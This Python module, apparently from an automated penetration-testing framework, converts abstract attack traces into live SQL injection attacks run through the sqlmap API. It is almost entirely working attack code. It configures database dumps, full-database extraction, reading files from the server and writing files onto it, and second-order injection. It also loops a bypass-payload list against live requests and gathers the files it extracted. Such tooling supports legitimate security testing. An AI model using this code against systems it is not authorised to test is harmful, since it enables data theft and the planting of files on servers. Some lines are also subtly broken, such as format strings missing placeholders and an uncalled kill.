#!/usr/local/bin/python3.5

"""
This module provides sql-injection extension
"""
import re
import json
import config
import requests
import itertools
import linecache
import threading
import modules.utils as utils

from modules.logger import logger
from modules.wrapper import sqlmap
from modules.http import execute_request
from os.path import expanduser
from os.path import join
from os.path import isfile
from os import listdir

# --==[ SQL Injection ]==--
# 1: whenever I find a sqli somewhere, look for i -> webapp : tuple(of_the_same_sqli)
#    if found, data extraction is performed and thus inside the sqli array I'll have
#    and entry [a,idx] where idx is the line where the injection should be performed
# 2: if I don't perform a data extraction, a 0 should appear
# 3: sqli.lfi identifies a sql-injection for reading
# 4: sqli.evil_file identifies a sql-injection for writing
#


# Matrix form:
# [ ['a',[( tag_where_to_exploit, [ parameters_to_exploit ])]],
#         ['n',0]
#         ['e',0] ]
# Where  a: attack
#        n: normal request
#        e: exploit

"""
Understands sql-injection attacks on the message sequence chart.
msc_table: is the message sequence chart table
extended: is a JSON structure that extendes the msc_table for concretizing
            attacks
"""
def sqli(msc_table,extended):
    logger.info("Looking for SQL injection attacks")
    sqli = []
    injection_point = ""

    # regexp
    r_sqli           = re.compile("(?:.*?)\.?sqli\.(?:.*)\.?")
    r_tuple_response = re.compile("(?:.*?)\.?tuple\(")
    r_tuple_request  = re.compile("([a-z]*?)\.s\.tuple\((?:.*?)\)(?:\.s)?")
    r_sqli_read      = re.compile("(?:.*?)e_file\((.*?)\)")
    r_sqli_write      = re.compile("(?:.*?)newFile\((.*?)\)")

    # data extraction
    tag_sqli = ""

    # second-order conditions
    so_cond1 = False # i -> webapp : <something>.sqli.<something>
    so_cond2 = False # i -> webapp : <something>
    so_cond3 = False # webapp -> i : tuple(<something>.sqli.<something>
    tag_so_cond1 = ""
    tag_so    = ""


    for idx, row in enumerate(msc_table):
        tag = row[0]
        step = row[1]
        sender = step[0]
        receiver = step[1]
        msg = step[2]
        entry = None

        if sender not in config.receiver_entities:
            # is a message from the intruder
            debugMsg = "Processing {}".format(msg)
            logger.debug(debugMsg)

            if r_sqli.search(msg) and "tuple(" not in msg:
                if so_cond1 == False:
                    so_cond1 = True
                    tag_so_cond1 = tag
                    logger.debug("so_cond1")
                # get the response
                response = msc_table[idx+1]
                response_msg = response[1][2]   # (tag , ( sender, receiver, msg))
                # and check if we have something function of file (sqli for file reading)
                match_ftr = r_sqli_read.search(response_msg)
                if match_ftr:
                    logger.debug("SQLi file-read {}".format(tag))

                    file_to_read = match_ftr.group(1)
                    extended[tag]["read"] = file_to_read
                    extended[tag]["attack"] = 1
                else:
                    # or something function of new_file (sqli for file writing)
                    match_ftw = r_sqli_write.search(response_msg)
                    if match_ftw:
                        logger.debug("SQLi file-write {}".format(tag))
                        
                        file_to_write = match_ftw.group(1)
                        extended[tag]["write"] = file_to_write
                        extended[tag]["attack"] = 2
                    else:
                    # ... otherwise is a sql injection
                        logger.debug("SQLi bypass {}".format(tag))
                        
                        params = utils.__get_parameters(msg)
                        entry = { "attack":10, "params" : params }
                        extended[tag]["attack"] = 10
                        tag_sqli = tag
            else:
                exploit_sqli = r_tuple_request.findall(msg)
                if exploit_sqli:
                    debugMsg = "Exploit SQLi {}".format(exploit_sqli)
                    logger.debug(debugMsg)
                    # it means we are using again the function tuple so it
                    # was a data extraction attack
                    debugMsg = "Change SQLi of {} to data extraction".format(tag_sqli)
                    logger.debug(debugMsg)
                    extended[tag_sqli]["attack"] = 0
                    extended[tag_sqli]["extract"] = exploit_sqli
                    extended[tag_sqli]["tag_sqli"] = tag
                    params = utils.__get_parameters(msg)
                    entry = { "attack" : 6, "params" : params }

                    extended[tag]["attack"] = 6
                elif tag != "tag":
                    # this is a normal request ...
                    # we check if previous conditions for so are valid
                        if so_cond1 == True and so_cond2 == False:
                            logger.debug("so_cond2")
                            so_cond2 = True
                            tag_so = tag
                        logger.debug("Normal request {}".format(tag))
                        params = utils.__get_parameters(msg)
                        entry = {"attack":-1,"params":params}

                        extended[tag]["attack"] = -1
        else:
            debugMsg = "Processing {}".format(msg)
            logger.debug(debugMsg)
            if r_tuple_response.search(msg):
                # we are exploiting a sqli
                if so_cond1 == True and so_cond2 == True and so_cond3 == False:
                    logger.debug("so_cond3")
                    # we check if previous conditions for so are valid
                    extended[tag_so_cond1]["attack"] = 8
                    extended[tag_so_cond1]["tag_so"] = tag_so
                    so_cond3 = True
                # param_regexp = re.compile(r'\.?([a-zA-Z]*?)\.tuple')
                # params = param_regexp.findall(msg)
                # print(msg)
                # params = utils.__get_parameters(msg)
                # entry = { "attack" : 6, "params" : params }
                # create a multiple array with params from different lines
                # t = msc_table[injection_point][0]
                # extended[t]["params"] = {tag:params}
                # extended[tag] = {"attack": 6}



def sqlmap_parse_data_extracted(sqlmap_output):
    global data_to_extract
    # Let's parse the data extracted
    debugMsg = "sqlmap output {}".format(sqlmap_output)
    logger.debug(debugMsg)
    extracted_values = {}
    debugMsg = "data to extract {}".format(data_to_extract)
    logger.debug(debugMsg)
    for tblcol in data_to_extract:
        debugMsg = "tblcol: ".format(tblcol)
        logger.debug(debugMsg)
        tbl_list = tblcol.split(".")
        debugMsg = "tbl_list[1]: ".format(tbl_list[1])
        logger.debug(debugMsg)
        tmp_table = tbl_list[0]
        tmp_column = tbl_list[1]
        try:
            extracted_values[tmp_table]
        except KeyError:
            extracted_values[tmp_table] = {}
        try:
            extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
        except Exception:
            logger.critical("error in the sqlmap output")
            sqlmap.kill
            exit()
        logger.debug("Ending sqlmap extraction")
        sqlmap.kill()
    return extracted_values


# sqlmap_details: url, methos, params [action]

def execute_sqlmap(sqlmap_details):
    global data_to_extract

    logger.info("run sqlmapapi.py")
    is_sqlmap_up = sqlmap.run_api_server()
    if not is_sqlmap_up:
        logger.critical("sqlmap server not running")
        exit()
    task = sqlmap.new_task()

    # configure proxy
    if config.proxy_ip and config.proxy_port and config.proxy_port.isdigit():
        sqlmap.set_option("proxy","http://{}:{}".format(config.proxy_ip, config.proxy_port), task)

    url = sqlmap_details["url"]
    method = sqlmap_details["method"]
    vuln_param = sqlmap_details["vuln_param"]

    url_params = ""
    if "get_params" in sqlmap_details:
        params = sqlmap_details["get_params"]
        url_params = ""
        for ab_k,real_c in params.items():
            # specify an injection point
            if ab_k == vuln_param:
                url_params = url_params+real_c[0]+"="+real_c[1]+"*&"
            else:
                url_params = url_params+real_c[0]+"="+real_c[1]+"&"
        url_params = url_params[:-1]

    body_params = ""
    if "post_params" in sqlmap_details:
        params = sqlmap_details["post_params"]
        body_params = ""
        for ab_k,real_c in params.items():
            # specify an injection point
            if ab_k == vuln_param:
                body_params = body_params+real_c[0]+"="+real_c[1]+"*&"
            else:
                body_params = body_params+real_c[0]+"="+real_c[1]+"&"
        body_params = body_params[:-1]

    url = url+"?"+url_params
    sqlmap.set_option("url",url,task)

    if method == "POST":
        sqlmap.set_option("data",body_params,task)

    # if "params" in sqlmap_details:
    #     params = sqlmap_details["params"]
    #     url_params = ""
    #     for k,v in params.items():
    #         url_params = url_params+k+"="+v+"&"
    #     url_params = url_params[:-1]
    #     if method == "GET":
    #         url = url+"?"+url_params
    #         sqlmap.set_option("url",url,task)
    #     elif method == "POST":
    #         sqlmap.set_option("url",url,task)
    #         sqlmap.set_option("data",url_params,task)

    # set cookie if present and should be considered
    if "cookies" in sqlmap_details:
        c = ""
        for k,v in sqlmap_details["cookies"].items():
            c = c + k + "=" + v + ";"
        debugMsg = "sqlmap with cookie {}".format(c)
        logger.debug(debugMsg)
        sqlmap.set_option("cookie",c,task)


    # BEGIN: set specific attack details
    # data extraction
    if "extract" in sqlmap_details:
        data_to_extract = sqlmap_details["extract"]
        sqlmap.set_option("dumpTable","true",task)
        # set data extraction only if we have data to extract
        col = ""
        tbl = ""
        for tblcol in data_to_extract:
            tbl_list = tblcol.split(".")
            # TODO: in here we're basically overwriting the table name
            # whenever we find a new one
            tbl = tbl_list[0]
            col = col + tbl_list[1]
        sqlmap.set_option("tbl",tbl,task)
        sqlmap.set_option("col",col,task)

    if "dumpall" in sqlmap_details:
        # dump the entire database
        sqlmap.set_option("dumpAll","true",task)

    # file read
    if "read" in sqlmap_details:
        file_to_extract = sqlmap_details["read"]
        sqlmap.set_option("rFile",file_to_extract,task)
    # file write
    if "write" in sqlmap_details:

        file_to_write = sqlmap_details["write"]
        remote_path = sqlmap_details["path"]
        if not isfile(file_to_write):
            criticalMsg = "Error: {} file not found".format(file_to_write)
            debug.critical(criticalMsg)
            exit()
        sqlmap.set_option("wFile",join(".",file_to_write),task)
        sqlmap.set_option("dFile",remote_path,task)
    # second order
    if "secondOrder" in sqlmap_details:
        secondOrder_url = sqlmap_details["secondOrder"]
        sqlmap.set_option("secondOrder",secondOrder_url,task)
    # END: set specific attack details

    logger.info("sqlmap analysis started")
    sqlmap.start_scan(url,task)

    stopFlag = threading.Event()
    sqlmap_data = None
    sqlmap_log = None
    while not stopFlag.wait(5):
        r = sqlmap.get_status(task)
        if "terminated" in r:
            logger.debug(sqlmap.get_log(task))
            sqlmap_data = sqlmap.get_data(task)
            sqlmap_log = sqlmap.get_log(task)
            stopFlag.set()
        else:
            logger.debug(sqlmap.get_log(task))
            logger.info("sqlmap analysis in progress ... ")

    # we check if the last message generated by sqlmap is critical
    # or an error
    level   = sqlmap_log[-1]["level"]
    message = sqlmap_log[-1]["message"]

    if level == "WARNING":
        logger.warning(message)

    if level == "INFO":
           logger.info(message)

    if level == "ERROR" or level == "CRITICAL":
        logger.critical("sqlmap generated an error")
        logger.critical(message)
        logger.critical("Aborting execution")
        exit()

    logger.info("sqlmap analysis terminated")

    return sqlmap_data, sqlmap_log


def execute_bypass(s,request,check):
    # now let's inject the params
    # TODO: fix, we assume we only have one param with ?
    params = request["params"]
    for park, parv in params.items():
        if parv == "?":
            with open("modules/sqli/bypasspayloads.txt") as f:
                for line in f.readlines():
                    params[park] = line.rstrip()
                    r = execute_request(s,request)
                    if check in r.text:
                        return True
    return False


"""
retrieve the list of files extracted by sqlmap which are stored in
~/.sqlmap/output/[domain]/files
"""
def get_list_extracted_files(attack_domain):
    files_extracted = []
    debugMsg = "domain {}".format(attack_domain)
    logger.debug(debugMsg)
    __sqlmap_files_path = expanduser(join("~",".sqlmap","output",attack_domain,"files"))

    try:
        files = [f for f in listdir(__sqlmap_files_path) if isfile(join(__sqlmap_files_path,f))]
    except FileNotFoundError:
        criticalMsg = "File not found {}".format(__sqlmap_files_path)
        logger.critical(criticalMsg)
        logger.critical("Aborting execution")
        exit(0)
    for f in files:
        tmp = join( __sqlmap_files_path, f)
        files_extracted.append(tmp)
    return files_extracted
        #txt = open(join(__sqlmap_files_path,f))
        #print(txt.read())
